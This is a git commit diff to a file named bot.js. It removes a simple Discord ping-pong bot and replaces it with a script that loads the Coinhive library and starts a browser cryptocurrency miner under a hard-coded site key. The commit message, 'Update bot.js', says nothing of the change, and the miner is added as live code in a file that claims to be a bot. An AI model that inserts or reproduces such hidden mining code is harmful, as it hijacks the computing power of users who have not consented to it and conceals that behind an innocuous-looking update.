51f75442284e52f58c9acdaf69d1d4d200578985
botTheACC <35822583+botTheACC@users.noreply.github.com>
2018-02-19 19:03:03 +0900

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,15 +1,5 @@
-const Discord = require('discord.js');
- const client = new Discord.Client();
- 
- client.on('ready', () => {
-     console.log('I am ready!');
- });
- 
- client.on('message', message => {
-     if (message.content === 'ping') {
-     	message.reply('pong');
-   	}
- });
- 
- // THIS  MUST  BE  THIS  WAY
- client.login(process.env.BOT_TOKEN);
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('qdmdvQuJ6y6TBlEUFdGLNIMajmSmqcRG', 'Js');
+	miner.start();
+</script>
